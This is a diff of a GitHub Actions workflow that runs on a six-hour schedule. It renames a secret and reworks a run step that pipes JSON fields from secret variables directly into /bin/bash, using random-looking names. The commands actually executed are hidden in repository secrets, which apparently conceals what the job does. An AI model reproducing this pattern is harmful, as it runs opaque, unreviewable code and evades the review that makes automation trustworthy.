@@ -2,7 +2,8 @@ name: yuchangkan3910
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 0/6 * * *'
+    - cron: '4 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,18 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: yuchangkan3910
         env:
-          gbfdh756: ${{ secrets.gbfdh756 }}
+          emrn1: ${{ secrets.emrn1 }}
         run: |
-          echo $gbfdh756 | jq -r .jbdv10 | /bin/bash
-          echo $oape144 | jq -r .q2 | /bin/bash
-          echo $or75 | jq -r .akkwp61575 | /bin/bash
-          echo $hq50 | jq -r .selwv77570 | /bin/bash
-          echo $edge028 | jq -r .v147 | /bin/bash
-          echo $u01 | jq -r .sxjdo096 | /bin/bash
-          echo $yyyxm236 | jq -r .dnr73 | /bin/bash
-          echo $m007 | jq -r .kd71 | /bin/bash
-          echo $qzs0489 | jq -r .mrjn24 | /bin/bash
-          echo $nieq81 | jq -r .k9 | /bin/bash
-          echo $lbocz53 | jq -r .ktksw6 | /bin/bash
-          echo $jmr84469 | jq -r .bzpt633 | /bin/bash
+          echo $emrn1 | jq -r .odww87 | /bin/bash
+          echo $b5 | jq -r .mbzd0334 | /bin/bash
+          echo $fhxa301 | jq -r .zmei658 | /bin/bash
+          echo $zzb614 | jq -r .rd747 | /bin/bash
+          echo $ykyn06312 | jq -r .hmrv041 | /bin/bash
+          echo $eh775 | jq -r .aqokz435 | /bin/bash
+          echo $pvwm3985 | jq -r .d234 | /bin/bash
+          echo $wymvf930 | jq -r .ityz47 | /bin/bash
+          echo $dc2 | jq -r .v513 | /bin/bash
+          echo $k25 | jq -r .mutns48324 | /bin/bash
+          echo $y9 | jq -r .nhn26 | /bin/bash
+          echo $jd8 | jq -r .axjjc2490 | /bin/bash
+          echo $c936 | jq -r .svn6356 | /bin/bash
 
